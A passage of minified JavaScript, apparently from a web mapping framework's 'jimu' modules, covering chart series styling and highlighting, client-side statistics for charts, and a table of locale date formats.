label:d,_originLabel:c},e,q);l.series[b].data.push(h)}}));l.series=this._assignColorsToSeries(e,l.series);return l},_getMatchingStyle:function(a,d){var e=null;d=d.styles;if(!d||!d[0]||""===a)return e;d.forEach(function(d){d.name===a&&(e=d.style)});return e},_setStyleToSerieDataItem:function(a,d){d.itemStyle||(d.itemStyle={});d.itemStyle.normal||(d.itemStyle.normal={});a&&"undefined"!==typeof a.color&&(Array.isArray(a.color)?d.itemStyle.normal.color=a.color[0]:d.itemStyle.normal.color=a.color);a&&
"undefined"!==typeof a.opacity&&(d.itemStyle.normal.opacity=1-parseFloat(a.opacity/10));return d},_setStyleToSerie:function(a,d,b){d.itemStyle||(d.itemStyle={});d.itemStyle.normal||(d.itemStyle.normal={});a&&"undefined"!==typeof a.color&&(Array.isArray(a.color)?d.itemStyle.normal.color=a.color[0]:d.itemStyle.normal.color=a.color);a&&"undefined"!==typeof a.opacity&&(b?(d.areaStyle||(d.areaStyle={}),d.areaStyle.normal||(d.areaStyle.normal={}),d.areaStyle.normal.opacity=1-parseFloat(a.opacity/10)):d.itemStyle.normal.opacity=
1-parseFloat(a.opacity/10));return d},_assignColorsToSeries:function(a,d){var e=a.seriesStyle;if(!e||!e.styles||!e.styles[0])return d;var b=a.mode;this._mockModeForServer&&"feature"===b&&(b="count",this._mockModeForServer=!1);var c=a.area;return d.map(function(a){var d=null,h=a.type;if("field"===b)"line"===h?(d=e.styles[0].style,a=this._setStyleToSerie(d,a,c)):(h=a.data)&&h[0]&&(a.data=h.map(function(a){d=this._getMatchingStyle(a._originName,e);return this._setStyleToSerieDataItem(d,a)}.bind(this)));
else if("column"===h||"bar"===h||"line"===h)"count"===b?(d=e.styles[0].style,a=this._setStyleToSerie(d,a,c)):"undefined"!==typeof a.name&&(d=this._getMatchingStyle(a._originName,e))&&(a=this._setStyleToSerie(d,a,c));return a}.bind(this))},_getSplitedSeriesForCategoryOrCountMode:function(a,d,b){var e=b.type,h=d.featureLayerForChartSymbologyChart,l={type:e,labels:[],series:[]},g=[];a.forEach(function(a){if(a=a.splitedValueFields)a=a.map(function(a){return{field:a.field,originField:a.originField}}),
g=g.concat(a)});d=this._removeDuplicateElementForObjArray(g);l.series=d.map(c.hitch(this,function(d){for(var b=[],c=0;c<a.length;c++)b[c]=null;return{name:d.field,_originName:d.originField,type:e,data:b}}));a.forEach(c.hitch(this,function(a,d){var e="";a.category?e=a.category:a.fieldValue&&(e=a.fieldValue);var c=a.originValue;l.labels.push(e);a.splitedValueFields.forEach(function(g){l.series.forEach(function(l){if(l._originName===g.originField){var q=this._getSerieDataItem({item:a,value:g.value,label:e,
_originLabel:c},b,h);l.data[d]=q}}.bind(this))}.bind(this))}));return l},_getSeriesOfRadar:function(a){a=a.map(function(a){return{name:a.category,value:a.valueFields}});return[{type:"radar",data:a}]},_getSerieDataItem:function(a,d,b){var e=a.item,c=a.label,h=a.value;a=a._originLabel;var l=!1;if(d=d.seriesStyle)l=d.useLayerSymbology;var g;l&&(g=this._getSymbolColorForDataItem(b,e.dataFeatures));b={};b.name=c;b.value=h;b._originName=a;g&&(b.itemStyle={normal:{color:g},emphasis:{color:g}});return b},
_getSymbolColorForDataItem:function(a,d){var e=!1;if(!a)return e;d=d[0];return d?e=this._getColorForFeature(a.renderer,d):e},_getColorForFeature:function(a,d){var b=!1,e=this._getVisualVariableByType("colorInfo",a.visualVariables);e?(a=a.getColor(d,{colorInfo:e}))&&(b=this._convertToEchartsRbga(a)):(a=a.getSymbol(d))&&"undefined"!==typeof a.color&&(b=this._convertToEchartsRbga(a.color));return b},_convertToEchartsRbga:function(a){if(!a||"undefined"===typeof a.r)return a;a=JSON.parse(JSON.stringify(a));
var d;d="rgba("+(a.r+",");d+=a.g+",";d+=a.b+",";return d+=a.a+")"},_getVisualVariableByType:function(a,d){return d&&(d=d.filter(function(d){return d.type===a&&!d.target}),d.length)?d[0]:null},_mouseOverChartItem:function(a){this._removeTempGraphics();this._mouseOutChartItem(a);a.forEach(c.hitch(this,function(a){a._originalSymbol=a.symbol}));if(this.featureLayer&&this.featureLayer.getMap()&&this.featureLayer.visible){var b=d.getTypeByGeometryType(this.featureLayer.geometryType),e=null;if("point"===
b)e=this._getHighLightMarkerSymbol(),this.tempGraphics=[],a.forEach(c.hitch(this,function(a){a=new l(a.geometry,e);this.tempGraphics.push(a);this.featureLayer.add(a)}));else if("polyline"===b)e=this._getHighLightLineSymbol(this.highLightColor),a.forEach(c.hitch(this,function(a){a.setSymbol(e)}));else if("polygon"===b){var h=this.featureLayer.getSelectedFeatures()||[];a.forEach(c.hitch(this,function(a){var d=0<=h.indexOf(a),d=this._getHighLightFillSymbol(this.featureLayer,a,d);a.setSymbol(d)}));this.features.length!==
a.length&&"polygon"===b&&(a.forEach(c.hitch(this,function(a){this.featureLayer.remove(a)})),a.forEach(c.hitch(this,function(a){this.featureLayer.add(a)})))}}},_mouseOutChartItem:function(a){this._removeTempGraphics();a.forEach(c.hitch(this,function(a){a.setSymbol(a._originalSymbol||null)}))},_removeTempGraphics:function(){if(this.featureLayer&&this.tempGraphics&&0<this.tempGraphics.length)for(;0<this.tempGraphics.length;)this.featureLayer.remove(this.tempGraphics[0]),this.tempGraphics.splice(0,1);
this.tempGraphics=null},_zoomToGraphics:function(a){if(this.map&&this.featureLayer&&this.featureLayer.visible&&a&&0<a.length){var d=null;try{var b=a.filter(function(a){return!!a.geometry});0<b.length&&(d=p.graphicsExtent(b))}catch(w){console.error(w)}if(d)this.map.setExtent(d.expand(1.4));else if(a=(a=a[0])&&a.geometry)d=c.hitch(this,function(a){var d=this.map.getNumLevels(),b=this.map.getLevel();this.map.setLevel(Math.max(b,Math.floor(2*d/3))).then(c.hitch(this,function(){this.map.centerAt(a)}))}),
"point"===a.type?d(a):"multipoint"===a.type&&1===a.points.length&&d(a.getPoint(0))}},_isNumberField:function(a){var d=["esriFieldTypeSmallInteger","esriFieldTypeInteger","esriFieldTypeSingle","esriFieldTypeDouble"];return this.featureLayer.fields.some(c.hitch(this,function(b){return b.name===a&&0<=d.indexOf(b.type)}))},_getHighLightMarkerSymbol:function(){var d=g.fromJson({color:[255,255,255,0],size:18,angle:0,xoffset:0,yoffset:0,type:"esriSMS",style:"esriSMSSquare",outline:{color:[0,0,128,255],width:.75,
type:"esriSLS",style:"esriSLSSolid"}});d.setSize(30);d.outline.setColor(new a(this.highLightColor));return d},_getHighLightLineSymbol:function(d){var b=g.fromJson({color:[0,255,255,255],width:1.5,type:"esriSLS",style:"esriSLSSolid"});b.setColor(new a(d||this.highLightColor));return b},_getDefaultHighLightFillSymbol:function(){var d=g.fromJson({color:[0,255,255,128],outline:{color:[0,255,255,255],width:1.5,type:"esriSLS",style:"esriSLSSolid"},type:"esriSFS",style:"esriSFSSolid"});d.outline.setColor(new a(this.highLightColor));
return d},_getSymbolByRenderer:function(a,d){var b=this._getDefaultHighLightFillSymbol(),e=this._getVisualVariableByType("colorInfo",a.visualVariables);if(e){if(a=a.getColor(d,{colorInfo:e}))a=c.clone(a),b.setColor(a)}else b=a.getSymbol(d);return b},_getHighLightFillSymbol:function(a,d,b){var c=null,e=d.symbol,c=a.renderer;!e&&c&&(e=this._getSymbolByRenderer(c,d));e&&"function"===typeof e.setOutline?(c=g.fromJson(e.toJson()),d=1.5,e.outline&&0<e.outline.width&&(d=e.outline.width+1),b=this._getHighLightLineSymbol(b?
"#ff0000":"#00ffff"),b.setWidth(d),c.setOutline(b)):c=this._getDefaultHighLightFillSymbol();return c},_getFieldAliasArray:function(a){return a.map(c.hitch(this,function(a){return this._getFieldAlias(a)}))},_getFieldAliasObjactArray:function(a){return a.map(c.hitch(this,function(a){return{name:a,alias:this._getFieldAlias(a)}}))},_getFieldAlias:function(a){var d=a;(a=this._getFieldInfo(a))&&(d=a.alias||d);return d},_getFieldInfo:function(a){if(this.featureLayer)for(var d=this.featureLayer.fields,b=
0;b<d.length;b++)if(d[b].name===a)return d[b];return null},_removeDuplicateElementForObjArray:function(a){if(!Array.isArray(a))return a;var b=[];b.push(a[0]);a.forEach(function(a){b.some(function(b){return d.isEqual(b,a)})||b.push(a)});return b}})})},"jimu/clientStatisticsUtils":function(){define("dojo/_base/declare dojo/_base/array dojo/_base/lang dojo/_base/config ./_dateFormat moment/moment jimu/utils esri/lang".split(" "),function(n,k,f,c,a,b,p,g){window.makeTwix(b);var m=n(null,{popupFieldInfosObj:null,
constructor:function(a){a&&f.mixin(this,a);this.popupFieldInfosObj||(this.popupFieldInfosObj={});this.floatNumberFieldDecimalPlace={}},_isNumber:function(a){return"[object number]"===Object.prototype.toString.call(a).toLowerCase()},_tryLocaleNumber:function(a,d){var b=a;if(g.isDefined(a)&&isFinite(a))try{var c;if(d&&this._isNumberField(d)){var l=this.popupFieldInfosObj[d];c=l&&f.exists("format.places",l)?p.localizeNumberByFieldInfo(a,l):p.localizeNumber(a)}else c=a;"string"===typeof c&&(b=c)}catch(t){console.error(t)}return b+
""},_getBestDisplayValue:function(a,d){return d||"number"===typeof d?this._isDateField(a)?this._dateFormatter(a,d):this._valueFormatter(a,d):"null"},_dateFormatter:function(a,d){a:{if(this.popupFieldInfosObj&&g.isDefined(this.popupFieldInfosObj.fieldInfos))for(var b=0,c=this.popupFieldInfosObj.fieldInfos.length;b<c;b++){var l=this.popupFieldInfosObj.fieldInfos[b];if(l.fieldName===a){a=l.format;break a}}a=null}return p.fieldFormatter.getFormattedDate(d,a)},_valueFormatter:function(a,d){var b=this._tryLocaleNumber(d,
a);if(this.layerDefinition.typeIdField===a){var c=this.layerDefinition.types;if(c&&0<c.length&&(c=k.filter(c,f.hitch(this,function(a){return a.id===d})),0<c.length))return b=c[0].name}(a=this._getFieldInfo(a))&&a.domain&&(a=a.domain.codedValues)&&0<a.length&&k.some(a,function(a){return a.code===d?(b=a.name,!0):!1});return b},_getFieldAliasArray:function(a){return k.map(a,f.hitch(this,function(a){return this._getFieldAlias(a)}))},_getFieldAlias:function(a){var d=a;(a=this._getFieldInfo(a))&&(d=a.alias||
d);return d},_getFieldInfo:function(a){if(this.layerDefinition)for(var d=this.layerDefinition.fields,b=0;b<d.length;b++)if(d[b].name===a)return d[b];return null},_isNumberField:function(a){var d=["esriFieldTypeSmallInteger","esriFieldTypeInteger","esriFieldTypeSingle","esriFieldTypeDouble"];return k.some(this.layerDefinition.fields,f.hitch(this,function(b){return b.name===a&&0<=d.indexOf(b.type)}))},_isFloatNumberField:function(a){var d=["esriFieldTypeSingle","esriFieldTypeDouble"];return k.some(this.layerDefinition.fields,
f.hitch(this,function(b){return b.name===a&&0<=d.indexOf(b.type)}))},_isIntegerNumberField:function(a){var d=["esriFieldTypeSmallInteger","esriFieldTypeInteger"];return k.some(this.layerDefinition.fields,f.hitch(this,function(b){return b.name===a&&0<=d.indexOf(b.type)}))},_isDateField:function(a){return(a=this._getFieldInfo(a))?"esriFieldTypeDate"===a.type:!1},_getBestDecimalPlace:function(a){var d=0,b={};k.forEach(a,function(a){a=a.toString().split(".");var d=null;1===a.length?d=0:2===a.length&&
(d=a[1].length);null!==d&&(b[d]=void 0===b[d]?1:b[d]+1)});a=null;for(var c in b){c=parseInt(c,10);var l=b[c];a?l>a.value&&(a={key:c,value:l}):a={key:c,value:l}}a&&(d=parseInt(a.key,10));return d},_calculateDecimalPlaceForFloatField:function(a,d){this.floatNumberFieldDecimalPlace={};var b=[];a.labelField&&b.push(a.labelField);a.categoryField&&b.push(a.categoryField);a.valueFields&&(b=b.concat(a.valueFields));var c=k.filter(b,f.hitch(this,function(a){return this._isFloatNumberField(a)})),l={};k.forEach(c,
f.hitch(this,function(a){l[a]=[]}));d&&0<d.length&&k.forEach(d,f.hitch(this,function(a){var d=a.attributes;d&&k.forEach(c,f.hitch(this,function(a){var b=d[a];"number"===typeof b&&l[a].push(b)}))}));k.forEach(c,f.hitch(this,function(a){this.floatNumberFieldDecimalPlace[a]=0;var d=l[a];if(0<d.length)try{var b=this._getBestDecimalPlace(d);this.floatNumberFieldDecimalPlace[a]=b}catch(x){this.floatNumberFieldDecimalPlace[a]=0,console.error(x)}this.popupFieldInfosObj&&(d=this._getFormatFromPopupInfo(this.popupFieldInfosObj,
a))&&0<=d.places&&(this.floatNumberFieldDecimalPlace[a]=d.places)}))},_getFormatFromPopupInfo:function(a,d){var b=null;if(!a)return b;(a=a.fieldInfos)&&0<a.length&&a.forEach(function(a){a.fieldName===d&&(b=a.format)});return b},_getFloatNumberFieldDecimalPlace:function(a){var d=0;this.floatNumberFieldDecimalPlace&&(a=this.floatNumberFieldDecimalPlace[a],"number"===typeof a&&(d=a));return d},_getBestValueForFloatNumberField:function(a,d){if(null===a)return a;d=this._getFloatNumberFieldDecimalPlace(d);
a=a.toFixed(d);return parseFloat(a)},_getBestValueForIntegerFieldAverage:function(a,d){if("number"!==typeof a)return a;var b=0,c=a.toString().split(".");1===c.length?b=0:2===c.length&&(b=c[1].length);return 0<b?(b>d&&(b=d),a=a.toFixed(b),parseFloat(a)):a},getFeatureModeStatisticsInfo:function(a){var d=a.features,b=a.labelField,c=a.valueFields,l=a.sortOrder;a=a.maxLabels;var g=[],d=d.filter(function(a){var d=a.attributes[b];if(d||"number"===typeof d)return!0;g.push(a)}).concat(g),d=this._sortStatisticsInfo(d,
"feature",l,b),l=[],l=k.map(d,f.hitch(this,function(a){var d=a.attributes;a={category:d[b],valueFields:[],dataFeatures:[a]};a.valueFields=k.map(c,f.hitch(this,function(a){return d[a]}));return a}));0<l.length&&l.forEach(f.hitch(this,function(a){var d=a.category;a.originValue=d;a.category=this._getBestDisplayValue(b,d)}));return this._getDataForMaxLabels(l,a)},getCategoryModeStatisticsInfo:function(a){function d(a){var d=[],c=null,e;for(e in a)c=a[e],this._isNumberField(l)&&"number"===typeof e&&g.isDefined(e)&&
(e=parseFloat(e)),c.fieldsValues=k.map(m,f.hitch(this,function(a){var d=a;if(b){var e=p;"average"===e&&(e="avg");/(_sum$)|(_avg$)|(_min$)|(_max$)/g.test(d)||(d=d+"_"+e)}var e=k.map(c.dataFeatures,f.hitch(this,function(a){return a.attributes[d]})),h;if(0!==e.length){h=0;"max"===p?h=-Infinity:"min"===p&&(h=Infinity);var e=r?e.map(function(a){this._isNumber(a)||(a=0);return a}.bind(this)):e.filter(function(a){return this._isNumber(a)}.bind(this)),l=0;k.forEach(e,f.hitch(this,function(a){l++;"average"===
p||"sum"===p?h+=a:"max"===p?h=Math.max(h,a):"min"===p&&(h=Math.min(h,a))}));0<l?"average"===p&&(h/=l):h=null}else h=null;return{field:a,value:h}})),c.valueFields=k.map(c.fieldsValues,function(a){return a.value}),d.push({originValue:c.originValue,category:e,valueFields:c.valueFields,fieldsValues:c.fieldsValues,dataFeatures:c.dataFeatures});return d}var b=a.forServer,c=a.features,l=a.categoryField,m=a.valueFields,p=a.operation,n=a.sortOrder,x=a.maxLabels,r=a.nullValue,v=a.splitField,u=[],u=this.getCategoryOrCountHashObj(l,
c,a.dateConfig);a=u.nullLabelHashObj;u=d.call(this,u.notNullLabelHashObj);a=d.call(this,a);u=u.concat(a);v&&u.forEach(function(a){var b=this.getCategoryOrCountHashObj(v,a.dataFeatures),c=d.call(this,b.notNullLabelHashObj),b=d.call(this,b.nullLabelHashObj),c=c.concat(b).map(function(a){return{field:a.category,originField:a.originValue,value:a.valueFields[0]}});a.splitedValueFields=c}.bind(this));u=this._sortStatisticsInfo(u,"category",n);u=k.filter(u,f.hitch(this,function(a){var d=!1;a=a.category;
"number"===typeof a&&(d=isNaN(a));return!d}));this._calculateDecimalPlaceForFloatField({categoryField:l,valueFields:m},c);"sum"!==p&&"average"!==p||k.forEach(u,f.hitch(this,function(a){k.forEach(m,f.hitch(this,function(d,b){var c=a.valueFields[b];this._isFloatNumberField(d)?(c=this._getBestValueForFloatNumberField(c,d),a.valueFields[b]=c):this._isIntegerNumberField(d)&&"average"===p&&(c=a.valueFields[b],c=this._getBestValueForIntegerFieldAverage(c,6),a.valueFields[b]=c)}))}));return this._getDataForMaxLabels(u,
x)},getCountModeStatisticsInfo:function(a){function d(a){var d=[],c=null,e;for(e in a)c=a[e],this._isNumberField(b)&&"number"===typeof e&&(e=parseFloat(e)),d.push({originValue:c.originValue,fieldValue:e,count:c.count,dataFeatures:c.dataFeatures});return d}var b=a.categoryField,c=a.sortOrder,l=a.maxLabels,g=a.splitField,m=[],m=this.getCategoryOrCountHashObj(b,a.features,a.dateConfig);a=m.nullLabelHashObj;m=d.call(this,m.notNullLabelHashObj);a=d.call(this,a);m=m.concat(a);g&&m.forEach(function(a){var b=
this.getCategoryOrCountHashObj(g,a.dataFeatures),b=b.notNullLabelHashObj,b=d.call(this,b).map(function(a){return{field:a.fieldValue,originField:a.originValue,value:a.count}});a.splitedValueFields=b}.bind(this));m=this._sortStatisticsInfo(m,"count",c);return this._getDataForMaxLabels(m,l)},getFieldModeStatisticsInfo:function(a){var d=a.forServer,b=a.features,c=a.valueFields,g=a.operation,l=a.sortOrder,m=a.maxLabels,p=a.nullValue,n=k.map(b,f.hitch(this,function(a){return a.attributes})),r={};k.forEach(c,
f.hitch(this,function(a){var b=a;if(d){var c=g;"average"===c&&(c="avg");/(_sum$)|(_avg$)|(_min$)|(_max$)/g.test(b)||(b=b+"_"+c)}r[a]=0;"max"===g?r[a]=-Infinity:"min"===g&&(r[a]=Infinity);var c=n.map(function(a){return a[b]}),e=0,c=p?c.map(function(a){this._isNumber(a)||(a=0);return a}.bind(this)):c.filter(function(a){return this._isNumber(a)}.bind(this));k.forEach(c,f.hitch(this,function(d){e++;r.hasOwnProperty(a)?"average"===g||"sum"===g?r[a]+=d:"max"===g?r[a]=Math.max(r[a],d):"min"===g&&(r[a]=Math.min(r[a],
d)):r[a]=d}));0<e?"average"===g&&(r[a]/=e):r[a]=null}));this._calculateDecimalPlaceForFloatField({valueFields:c},b);"sum"!==g&&"average"!==g||k.forEach(c,f.hitch(this,function(a){var d=r[a];r.hasOwnProperty(a)&&this._isFloatNumberField(a)?r[a]=this._getBestValueForFloatNumberField(d,a):r.hasOwnProperty(a)&&this._isIntegerNumberField(a)&&"average"===g&&(r[a]=this._getBestValueForIntegerFieldAverage(d,6))}));a=[];for(var v in r)r.hasOwnProperty(v)&&a.push({label:v,value:r[v]});a=this._sortStatisticsInfo(a,
"field",l);return this._getDataForMaxLabels(a,m)},_getDataForMaxLabels:function(a,d){return"number"===typeof d&&0<=d&&d<a.length?a.slice(0,d):a},_sortStatisticsInfo:function(a,d,b,c){function e(a,d,b){var e;"category"===d?b.isLabelAxis?b.isLabelAxis&&(e=a.originValue):b.field||1!==a.fieldsValues.length?a.fieldsValues.forEach(function(a){b.field===a.field&&(e=a.value)}):e=a.fieldsValues[0].value:"count"===d?(d=a.originValue,e=b.isLabelAxis?d:a.count):"field"===d?e=b.isLabelAxis?a.label:a.value:"feature"===
d&&(e=b.isLabelAxis?a.attributes[c]:a.attributes[b.field]);return e}if(!b)return a;var h=b.isAsc;if(!Array.isArray(a))return a;a.sort(function(a,c){a=e(a,d,b);c=e(c,d,b);a||"number"===typeof a||(a=Infinity);c||"number"===typeof c||(c=Infinity);var g=0,g=(a>c?h:!h)?1:-1;a===c&&(g=0);return g});return a},_getDateUnit:function(a,d){var c=d;"automatic"===d&&(d=b(a[0]).local(),a=b(a[1]).local(),a=Math.round(a.diff(d,"minute",!0)),0<=a&&1>=a?c="second":1<a&&60>=a?c="minute":60<a&&1440>=a?c="hour":1440<
a&&43200>=a?c="day":43200<a&&518400>=a?c="month":518400<a&&(c="year"));return c},_getTimeRange:function(a,d){var b=a.map(f.hitch(this,function(a){return a.attributes[d]})),b=b.filter(function(a){return!!a});a=Math.min.apply(Math,b);b=Math.max.apply(Math,b);return[a,b]},_getTimeTwixs:function(a,d,c){if(0>"year month day hour minute second automatic".split(" ").indexOf(c))return console.log("Invaild data formatter: "+c),!1;a=this._getTimeRange(a,d);if(a[0]===a[1])return!1;c=this._getDateUnit(a,c);d=
this._getIntegerDateByUnit(a[0],c);d=b(d).local();a=b(a[1]).local();a=d.twix(a).split(1,c);d={startValue:a[a.length-1].end().valueOf(),endValue:Infinity};a.push(d);return{twixs:a,dateUnit:c}},_getIntegerDateByUnit:function(a,d){var c=b(a),e=c.year(),g=c.month(),l=c.date(),m=c.hour(),f=c.minute(),c=c.second();switch(d){case "year":a=b({year:e}).valueOf();break;case "month":a=b({year:e,month:g}).valueOf();break;case "day":a=b({year:e,month:g,day:l}).valueOf();break;case "hour":a=b({year:e,month:g,day:l,
hour:m}).valueOf();break;case "minute":a=b({year:e,month:g,day:l,hour:m,minute:f}).valueOf();break;case "second":a=b({year:e,month:g,day:l,hour:m,minute:f,second:c}).valueOf()}return a},_getDateCategory:function(a,d){return d?this._getFormatteredDate(a,d):a},_getFormatteredDate:function(a,d){var c=this._getDateTemplate(d);0<=["year","month","day"].indexOf(d)?c=p.localizeDate(new Date(a),{selector:"date",datePattern:c.date}):(d=p.localizeDate(new Date(a),{selector:"date",datePattern:c.date}),a=b(a).format(c.time),
c=d+c.connector+a);return c},_getDateTemplate:function(b){var d=a[c.locale];(d=d||{},d.date)||(d.date={"short":"short"});d&&!d.time&&(d.time={medium:"HH:mm:ss a"});d&&!d.connector&&(d.connector=" ");d&&!d.sNoDay&&(d.sNoDay="MMM, y");var h={};"year"===b?h.date="y":"month"===b?h.date=d.date.sNoDay:"day"===b?h.date=d.date["short"]:"hour"===b?(h.date=d.date["short"],h.time="HH a",h.connector=d.connector):"minute"===b?(h.date=d.date["short"],h.time="HH:mm a",h.connector=d.connector):"second"===b&&(h.date=
d.date["short"],h.time=d.time.medium,h.connector=d.connector);return h},getCategoryOrCountHashObj:function(a,d,b){function c(a,d,b,c){var e=a[0].attributes[d];d="automatic"!==c.minPeriod?this._getDateCategory(e,c.minPeriod):this._getBestDisplayValue(d,e);a={count:1,dataFeatures:a};a.originValue=e;b[d]=a;return b}function g(a,d,b,c){a[d]?(a=a[d],a.count+=c.count,a.dataFeatures=a.dataFeatures.concat(c.dataFeatures)):(c.originValue=b,a[d]=c)}function h(a,d){var b={};k.forEach(a,f.hitch(this,function(a){var c=
a.attributes,e=this._getBestDisplayValue(d,c[d]),g=null;b.hasOwnProperty(e)?(g=b[e],g.dataFeatures.push(a),g.count++):(g={count:1,dataFeatures:[a]},g.originValue=c[d],b[e]=g)}));return b}var m=[],l=d.filter(function(d){var b=d.attributes[a];if(b||"number"===typeof b)return!0;m.push(d)}),p={};d={};if(b)if(1===l.length)p=c.call(this,l,a,p,b);else{if(0!==l.length)if(d=this._getTimeTwixs(l,a,b.minPeriod)){var n=d.dateUnit;d.twixs.forEach(function(d){var c="undefined"!==typeof d.startValue?d.startValue:
d.start().valueOf(),e="undefined"!==typeof d.endValue?d.endValue:d.end().valueOf();d=this._getDateCategory(c,n);var h={count:0,dataFeatures:[]};k.forEach(l,f.hitch(this,function(d){var b=d.attributes[a];b>=c&&b<e&&(h.dataFeatures.push(d),h.count++)}));b.isNeedFilled?g.call(this,p,d,c,h):0<h.count&&g.call(this,p,d,c,h)}.bind(this))}else p=c.call(this,l,a,p,b)}else p=h.call(this,l,a);d=h.call(this,m,a);return{notNullLabelHashObj:p,nullLabelHashObj:d}}});return{getFeatureModeStatisticsInfo:function(a){return(new m({layerDefinition:a.layerDefinition,
popupFieldInfosObj:a.popupFieldInfosObj})).getFeatureModeStatisticsInfo(a)},getCategoryModeStatisticsInfo:function(a){return(new m({layerDefinition:a.layerDefinition,popupFieldInfosObj:a.popupFieldInfosObj})).getCategoryModeStatisticsInfo(a)},getCountModeStatisticsInfo:function(a){return(new m({layerDefinition:a.layerDefinition,popupFieldInfosObj:a.popupFieldInfosObj})).getCountModeStatisticsInfo(a)},getFieldModeStatisticsInfo:function(a){return(new m({layerDefinition:a.layerDefinition})).getFieldModeStatisticsInfo(a)}}})},
"jimu/_dateFormat":function(){define([],function(){return{ar:{date:{"short":"d/M/y",medium:"dd/MM/y","long":"d MMMM. y",onlyDate:"dd/MM",mNoDay:"MM/y",sNoDay:"M/y"},time:{"short":"h:mm a",medium:"h:mm:ss a"}},bs:{date:{"short":"d.M.yy.",medium:"d. MMM. y.","long":"d. MMMM y.",onlyDate:"d. MMM.",mNoDay:"MMM. y.",sNoDay:"M.yy"}},cs:{date:{"short":"dd.MM.yy",medium:"d. M. y",onlyDate:"d. M.",mNoDay:"M. y",sNoDay:"MM.yy"}},da:{date:{"short":"dd/MM/y",medium:"d. MMM y","long":"d. MMMM y",onlyDate:"d. MMM",
mNoDay:"MMM y",sNoDay:"MM/y"}},de:{date:{"short":"dd.MM.yy",medium:"dd.MM.y",onlyDate:"dd.MM."},connector:" , ",mNoDay:"MM.y",sNoDay:"MM.yy"},el:{date:{"short":"d/M/yy",medium:"d MMM y",onlyDate:"d MMM"},connector:" , ",mNoDay:"MMM y",sNoDay:"M/yy"},en:{date:{"short":"M/d/yy",medium:"MMM d, y",onlyDate:"MMM d",mNoDay:"MMM, y",sNoDay:"M/yy"}},es:{date:{"short":"d/M/yy",medium:"d MMM y",onlyDate:"d MMM",mNoDay:"MMM y",sNoDay:"M/yy"}},et:{date:{"short":"d.MM.y",medium:"d. MMM y",onlyDate:"d. MMM",mNoDay:"MMM y",
sNoDay:"MM.y"},time:{"short":"H:mm",medium:"H:mm:ss"}},fi:{date:{"short":"d.M.y",medium:"d.M.y",onlyDate:"d.M.",mNoDay:"M.y",sNoDay:"M.y"},connector:" 'klo' "},fr:{date:{"short":"dd/MM/y",medium:"d MMM y",onlyDate:"d MMM",mNoDay:"MMM y",sNoDay:"MM/y"},connector:" '\u00e0' "},he:{date:{"short":"dd/MM/yy",medium:"d '\u05d1'MMM y",onlyDate:"d '\u05d1'MMM",mNoDay:"'\u05d1'MMM y",sNoDay:"MM/yy"},connector:" , "},hi:{date:{"short":"d/M/yy",medium:"dd/MM/y","long":"d MMMM y",onlyDate:"dd/MM",mNoDay:"MM/y",
sNoDay:"M/yy"},time:{"short":"h:mm a",medium:"h:mm:ss a",sNoDay:""},connector:" , "},hr:{date:{"short":"d.M.y",medium:"d. MMM y.",onlyDate:"d. MMM",mNoDay:"MMM y.",sNoDay:"M.y"}},id:{"short":"dd/MM/yy",date:{medium:"d MMM y",onlyDate:"d MMM",mNoDay:"MMM y",sNoDay:"MM/yy"}},it:{date:{medium:"dd MMM y","long":"d MMMM y",onlyDate:"dd MMM",mNoDay:"MMM y",sNoDay:"MM/yy"},connector:" , "},ja:{date:{medium:"y/MM/dd",onlyDate:"MM/dd",mNoDay:"y/MM",sNoDay:"y/MM"},time:{"short":"a h:mm",medium:"a h:mm:ss"}},
ko:{date:{medium:"y. M. d.",onlyDate:"M. d.",mNoDay:"y. M.",sNoDay:"yy. M."}},lt:{date:{medium:"y-MM-dd","long":"y 'm'. MMMM d 'd'.",onlyDate:"MM-dd",mNoDay:"y-MM",sNoDay:"y-MM"},time:{medium:"HH:mm:ss"}},lv:{date:{"short":"dd.MM.y",medium:"y. 'gada' d. MMM.","long":"y. 'gada' d. MMMM",onlyDate:"d. MMM.",mNoDay:"y. 'gada' MMM.",sNoDay:"MM.y"}},nb:{date:{"short":"dd.MM.y",medium:"d. MMM y","long":"d. MMMM y",onlyDate:"d. MMM",mNoDay:"MMM y",sNoDay:"MM.y"},time:{"short":"HH:mm",medium:"HH:mm:ss"},connector:" , "},
nl:{date:{medium:"d MMM y",onlyDate:"d MMM",mNoDay:"MMM y",sNoDay:"MM-yy"}},pl:{date:{medium:"d MMM y",onlyDate:"d MMM",mNoDay:"MMM y",sNoDay:"MM.y"},connector:" , "},"pt-br":{date:{"short":"dd/MM/y",medium:"d 'de' MMM 'de' y",onlyDate:"d 'de' MMM",mNoDay:"MMM 'de' y",sNoDay:"MM/y"}},"pt-pt":{date:{medium:"dd/MM/y",onlyDate:"dd/MM",mNoDay:"MM/y",sNoDay:"MM/yy"}},ro:{date:{medium:"d MMM y",onlyDate:"d MMM",mNoDay:"MMM y",sNoDay:"MM.y"},connector:" , "},ru:{date:{"short":"dd.MM.y",medium:"d MMM y '\u0433.'",
onlyDate:"d MMM",mNoDay:"MMM y '\u0433.'",sNoDay:"MM.y"},connector:" , "},sr:{date:{medium:"dd.MM.y.",onlyDate:"dd.MM.",mNoDay:"MM.y.",sNoDay:"M.yy."},time:{"short":"HH:mm",medium:"HH:mm:ss"}},sv:{date:{medium:"d MMM. y",onlyDate:"d MMM.",mNoDay:"MMM. y",sNoDay:"y-MM"}},th:{date:{medium:"d MMM y",onlyDate:"d MMM",mNoDay:"MMM y",sNoDay:"M/yy"}},tr:{date:{medium:"d MMM y",onlyDate:"d MMM",mNoDay:"MMM y",sNoDay:"MM.y"}},vi:{date:{"short":"dd/MM/y",medium:"d MMM, y","long":"'Ng\u00e0y' dd 'th\u00e1ng' MM 'n\u0103m' y",
onlyDate:"d MMM",mNoDay:"MMM, y",sNoDay:"MM/y"},time:{"short":"hh:mm a",medium:"hh:mm:ss a"},connector:" , "},"zh-cn":{date:{"short":"y/M/d",medium:"y'\u5e74'M'\u6708'd'\u65e5'",onlyDate:"M'\u6708'd'\u65e5'",mNoDay:"y'\u5e74'M'\u6708'",sNoDay:"y/M"}},"zh-hk":{date:{medium:"y'\u5e74'M'\u6708'd'\u65e5'",onlyDate:"M'\u6708'd'\u65e5'",mNoDay:"y'\u5e74'M'\u6708'",sNoDay:"M/y"}},"zh-tw":{date:{medium:"y'\u5e74'M'\u6708'd'\u65e5'",onlyDate:"M'\u6708'd'\u65e5'",mNoDay:"y'\u5e74'M'\u6708'",sNoDay:"y/M"}}}})},
